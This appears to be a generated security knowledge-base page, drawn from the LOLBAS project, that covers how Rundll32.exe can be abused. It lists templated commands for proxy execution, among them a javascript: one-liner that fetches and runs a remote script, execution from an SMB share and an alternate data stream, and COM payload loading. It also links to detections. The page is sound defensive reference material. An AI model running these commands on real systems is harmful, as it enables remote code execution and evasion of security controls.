---
title: "Rundll32.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Rundll32.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Rundll32.exe"
functions:
  - "Execute"
  - "ADS"
attack_technique_ids:
  - "T1218.011"
  - "T1564.004"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Used by Windows to execute dll files

## Paths

- `C:\Windows\System32\rundll32.exe`
- `C:\Windows\SysWOW64\rundll32.exe`

## Commands

### 1. Execute

First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute.

```cmd
rundll32.exe {PATH},EntryPoint
```

- Use Case: Execute DLL file
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

### 2. Execute

Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.

```cmd
rundll32.exe {PATH_SMB:.dll},EntryPoint
```

- Use Case: Execute DLL from SMB share.
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

### 3. Execute

Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
```

- Use Case: Execute code from Internet
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

### 4. ADS

Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).

```cmd
rundll32 "{PATH}:ADSDLL.dll",DllMain
```

- Use Case: Execute code from alternate data stream
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]

### 5. Execute

Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.

```cmd
rundll32.exe -sta {CLSID}
```

- Use Case: Execute a DLL/EXE COM server payload or ScriptletURL code.
- Privileges: User
- Operating System: Windows 10 (and likely previous versions), Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml
- IOC: Outbount Internet/network connections made from rundll32
- IOC: Suspicious use of cmdline flags such as -sta

## Resources

- {'Link': 'https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/'}
- {'Link': 'https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7'}
- {'Link': 'https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/'}
- {'Link': 'https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/'}
- {'Link': 'https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/'}
- {'Link': 'https://github.com/sailay1996/expl-bin/blob/master/obfus.md'}
- {'Link': 'https://github.com/sailay1996/misc-bin/blob/master/rundll32.md'}
- {'Link': 'https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90'}
- {'Link': 'https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code'}

## Acknowledgements

- {'Person': 'Casey Smith', 'Handle': '@subtee'}
- {'Person': 'Oddvar Moe', 'Handle': '@oddvarmoe'}
- {'Person': 'Jimmy', 'Handle': '@bohops'}
- {'Person': 'Sailay', 'Handle': '@404death'}
- {'Person': 'Martin Ingesen', 'Handle': '@Mrtn9'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml)
